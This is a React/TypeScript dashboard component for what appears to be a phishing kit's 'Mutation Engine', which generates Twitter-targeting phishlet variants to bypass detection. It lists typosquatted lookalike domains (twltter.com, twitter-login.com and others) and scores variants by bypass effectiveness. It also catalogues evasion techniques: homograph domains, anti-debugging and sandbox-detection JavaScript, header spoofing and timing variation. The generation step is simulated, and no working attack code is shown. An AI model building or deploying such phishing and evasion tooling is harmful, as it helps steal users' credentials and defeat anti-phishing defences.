import React, { useState } from 'react';
import { Card, Button, Table, Tag, Progress, Alert, Tabs, Select, InputNumber, Switch } from 'antd';
import { 
  ThunderboltOutlined, 
  PlayCircleOutlined, 
  DownloadOutlined,
  SettingOutlined,
  ReloadOutlined,
  BugOutlined
} from '@ant-design/icons';

const { TabPane } = Tabs;
const { Option } = Select;

interface MutationVariant {
  id: string;
  name: string;
  bypass_score: number;
  operational_risk: string;
  mutations_applied: string[];
  status: 'ready' | 'generating' | 'completed';
}

const MutationEngine: React.FC = () => {
  const [variants, setVariants] = useState<MutationVariant[]>([
    {
      id: '1',
      name: 'twitter_variant_1',
      bypass_score: 0.85,
      operational_risk: 'medium',
      mutations_applied: ['domain_variation', 'path_obfuscation', 'header_manipulation'],
      status: 'completed'
    },
    {
      id: '2',
      name: 'twitter_variant_2',
      bypass_score: 0.92,
      operational_risk: 'high',
      mutations_applied: ['domain_variation', 'javascript_injection', 'timing_variation'],
      status: 'completed'
    },
    {
      id: '3',
      name: 'twitter_variant_3',
      bypass_score: 0.78,
      operational_risk: 'low',
      mutations_applied: ['parameter_randomization', 'user_agent_rotation'],
      status: 'ready'
    }
  ]);

  const [mutationConfig, setMutationConfig] = useState({
    domain_variation: true,
    path_obfuscation: true,
    parameter_randomization: true,
    header_manipulation: true,
    javascript_injection: true,
    timing_variation: true,
    user_agent_rotation: true,
    content_encoding: true
  });

  const [generating, setGenerating] = useState(false);

  const variantColumns = [
    { title: 'Variant Name', dataIndex: 'name', key: 'name' },
    { 
      title: 'Bypass Score', 
      dataIndex: 'bypass_score', 
      key: 'bypass_score',
      render: (score: number) => (
        <Progress 
          percent={score * 100} 
          size="small" 
          strokeColor={score > 0.8 ? '#52c41a' : score > 0.6 ? '#faad14' : '#ff4d4f'}
        />
      )
    },
    { 
      title: 'Risk Level', 
      dataIndex: 'operational_risk', 
      key: 'operational_risk',
      render: (risk: string) => (
        <Tag color={risk === 'high' ? 'red' : risk === 'medium' ? 'orange' : 'green'}>
          {risk.toUpperCase()}
        </Tag>
      )
    },
    { 
      title: 'Status', 
      dataIndex: 'status', 
      key: 'status',
      render: (status: string) => (
        <Tag color={status === 'completed' ? 'green' : status === 'generating' ? 'blue' : 'default'}>
          {status.toUpperCase()}
        </Tag>
      )
    },
    { title: 'Actions', key: 'actions', render: () => (
      <Button size="small" icon={<DownloadOutlined />}>
        Download
      </Button>
    )}
  ];

  const techniqueColumns = [
    { title: 'Technique', dataIndex: 'technique', key: 'technique' },
    { title: 'Description', dataIndex: 'description', key: 'description' },
    { title: 'Effectiveness', dataIndex: 'effectiveness', key: 'effectiveness' },
    { title: 'Detection Risk', dataIndex: 'risk', key: 'risk' }
  ];

  const techniqueData = [
    { 
      key: '1', 
      technique: 'Domain Variation', 
      description: 'Generate homograph and typosquatting domains',
      effectiveness: '85%',
      risk: 'Medium'
    },
    { 
      key: '2', 
      technique: 'Path Obfuscation', 
      description: 'Randomize paths and add fake parameters',
      effectiveness: '72%',
      risk: 'Low'
    },
    { 
      key: '3', 
      technique: 'JavaScript Injection', 
      description: 'Inject anti-debugging and sandbox detection',
      effectiveness: '94%',
      risk: 'High'
    },
    { 
      key: '4', 
      technique: 'Header Manipulation', 
      description: 'Spoof headers and add random values',
      effectiveness: '68%',
      risk: 'Low'
    }
  ];

  const handleGenerateVariants = async () => {
    setGenerating(true);
    // Simulate generation process
    setTimeout(() => {
      setGenerating(false);
      // Update variant status
      setVariants(prev => prev.map(v => 
        v.status === 'ready' ? { ...v, status: 'completed' } : v
      ));
    }, 3000);
  };

  const handleConfigChange = (key: string, value: boolean) => {
    setMutationConfig(prev => ({
      ...prev,
      [key]: value
    }));
  };

  const getOverallEffectiveness = () => {
    const enabledTechniques = Object.values(mutationConfig).filter(Boolean).length;
    const totalTechniques = Object.keys(mutationConfig).length;
    return (enabledTechniques / totalTechniques) * 100;
  };

  return (
    <div className="mutation-engine">
      <div style={{ marginBottom: 24 }}>
        <h2><ThunderboltOutlined /> Mutation Engine</h2>
        <p>Advanced phishlet mutation for detection bypass</p>
      </div>

      {/* Configuration */}
      <Card title="Mutation Configuration" style={{ marginBottom: 24 }}>
        <div style={{ marginBottom: 16 }}>
          <Alert
            message="Configuration Ready"
            description={`${Object.values(mutationConfig).filter(Boolean).length} of ${Object.keys(mutationConfig).length} techniques enabled`}
            type="info"
            showIcon
          />
        </div>
        
        <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fit, minmax(250px, 1fr))', gap: 16 }}>
          {Object.entries(mutationConfig).map(([key, value]) => (
            <div key={key} style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', padding: '8px 0' }}>
              <span style={{ textTransform: 'capitalize' }}>{key.replace('_', ' ')}</span>
              <Switch checked={value} onChange={(checked) => handleConfigChange(key, checked)} />
            </div>
          ))}
        </div>
        
        <div style={{ marginTop: 16, textAlign: 'center' }}>
          <Button 
            type="primary" 
            icon={<PlayCircleOutlined />} 
            onClick={handleGenerateVariants}
            loading={generating}
            size="large"
          >
            Generate Variants
          </Button>
        </div>
      </Card>

      {/* Generated Variants */}
      <Card title="Generated Variants" style={{ marginBottom: 24 }}>
        <div style={{ marginBottom: 16 }}>
          <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
            <span>Overall Effectiveness: {getOverallEffectiveness().toFixed(0)}%</span>
            <Button icon={<ReloadOutlined />} size="small">
              Refresh
            </Button>
          </div>
          <Progress 
            percent={getOverallEffectiveness()} 
            strokeColor="#1890ff"
            style={{ marginTop: 8 }}
          />
        </div>
        
        <Table
          columns={variantColumns}
          dataSource={variants}
          pagination={false}
          size="small"
          expandable={{
            expandedRowRender: (record: MutationVariant) => (
              <div style={{ padding: 16 }}>
                <h4>Applied Mutations:</h4>
                <div style={{ display: 'flex', flexWrap: 'wrap', gap: 8 }}>
                  {record.mutations_applied.map((mutation, index) => (
                    <Tag key={index} color="blue">{mutation}</Tag>
                  ))}
                </div>
              </div>
            )
          }}
        />
      </Card>

      {/* Mutation Techniques */}
      <Card>
        <Tabs defaultActiveKey="techniques">
          <TabPane tab="Mutation Techniques" key="techniques">
            <Table
              columns={techniqueColumns}
              dataSource={techniqueData}
              pagination={false}
              size="small"
            />
          </TabPane>
          
          <TabPane tab="Domain Variations" key="domains">
            <div style={{ marginBottom: 16 }}>
              <h4>Generated Domain Variations</h4>
              <div style={{ display: 'flex', flexWrap: 'wrap', gap: 8 }}>
                {['twltter.com', 'twwitter.com', 'twitter-login.com', 'twitter-security.com', 'twitter-auth.com'].map((domain, index) => (
                  <Tag key={index} color="purple">{domain}</Tag>
                ))}
              </div>
            </div>
            
            <div>
              <h4>Techniques Applied:</h4>
              <ul>
                <li>Homograph attacks ( Cyrillic characters )</li>
                <li>Typosquatting ( character substitution )</li>
                <li>Subdomain variation ( prefix/suffix )</li>
                <li>TLD variation ( alternative domains )</li>
              </ul>
            </div>
          </TabPane>
          
          <TabPane tab="Evasion Techniques" key="evasion">
            <div>
              <h4>Anti-Detection Mechanisms</h4>
              <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fit, minmax(300px, 1fr))', gap: 16 }}>
                <Card size="small" title="JavaScript Obfuscation">
                  <p>Anti-debugging and sandbox detection code injection</p>
                  <Tag color="green">Active</Tag>
                </Card>
                <Card size="small" title="Timing Variation">
                  <p>Random delays and human-like interaction patterns</p>
                  <Tag color="green">Active</Tag>
                </Card>
                <Card size="small" title="Header Manipulation">
                  <p>Browser fingerprint spoofing and random headers</p>
                  <Tag color="orange">Partial</Tag>
                </Card>
                <Card size="small" title="Content Encoding">
                  <p>Gzip/deflate compression and content variation</p>
                  <Tag color="green">Active</Tag>
                </Card>
              </div>
            </div>
          </TabPane>
        </Tabs>
      </Card>
    </div>
  );
};

export default MutationEngine;
